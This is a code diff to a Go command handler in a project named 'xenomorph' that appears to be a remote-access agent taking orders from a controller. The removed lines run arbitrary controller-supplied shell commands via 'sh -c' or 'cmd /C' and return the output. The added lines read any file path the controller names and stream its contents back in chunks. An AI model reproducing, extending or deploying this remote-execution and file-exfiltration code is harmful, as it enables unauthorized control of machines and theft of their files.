@@ -1,10 +1,7 @@
 package command
 
 import (
-	"os/exec"
-	"runtime"
-	"strings"
-	"time"
+	"os"
 
 	"github.com/codevault-llc/xenomorph/pkg/logger"
 	"github.com/codevault-llc/xenomorph/pkg/types"
@@ -13,47 +10,43 @@ import (
 
 func initDownloadCommand() {
 	err := commandHandler.AddCommand("download", func(client types.ClientController, msgID uint32, command types.Command) {
-		logger.L().Info("Received 'terminal' command", zap.String("command", command.Name), zap.Strings("args", command.Args))
+		filePath := command.Args[0]
 
-		if len(command.Args) == 0 {
-			response := types.CommandResponse{
-				ID:     command.ID,
-				Output: "",
-				Error:  "No command specified",
-			}
-			client.Send(types.MsgCommandResponse, 0, msgID, []byte(response.ToJSON()))
+		file, err := os.Open(filePath)
+		if err != nil {
+			logger.L().Error("Failed to open file", zap.Error(err))
 			return
 		}
+		defer file.Close()
 
-		// Combine the command into a single string for shell execution
-		cmdStr := strings.Join(command.Args, " ")
+		fi, _ := file.Stat()
 
-		var execCmd *exec.Cmd
-		if runtime.GOOS == "windows" {
-			execCmd = exec.Command("cmd", "/C", cmdStr)
-		} else {
-			execCmd = exec.Command("sh", "-c", cmdStr)
+		metadata := types.FileMetadata{
+			ID:    msgID,
+			Name:  fi.Name(),
+			Size:  fi.Size(),
+			Direction: "upload",
 		}
 
-		start := time.Now()
-		output, err := execCmd.CombinedOutput()
-		duration := time.Since(start).Milliseconds()
+		client.Send(types.MsgFileStart, 0, msgID, []byte(metadata.ToJSON()))
 
-		resp := types.CommandResponse{
-			ID:       command.ID,
-			Output:   string(output),
-			Error:    "",
-			Duration: duration,
+		buf := make([]byte, 4096)
+		for {
+			n, err := file.Read(buf)
+			if n > 0 {
+				client.Send(types.MsgFileChunk, 0, msgID, buf[:n])
+			}
+
+			if err != nil {
+				break
+			}
 		}
 
-		if err != nil {
-			resp.Error = err.Error()
-			logger.L().Error("Terminal command failed", zap.Error(err), zap.String("cmd", cmdStr))
-		} else {
-			logger.L().Info("Terminal command succeeded", zap.String("cmd", cmdStr), zap.String("output", strings.TrimSpace(string(output))))
+		fileEndMsg := types.FileEnd{
+			ID: msgID,
 		}
 
-		client.Send(types.MsgFileStart, 0, msgID, []byte(resp.ToJSON()))
+		client.Send(types.MsgFileEnd, 0, msgID, []byte(fileEndMsg.ToJSON()))
 	})
 
 	if err != nil {
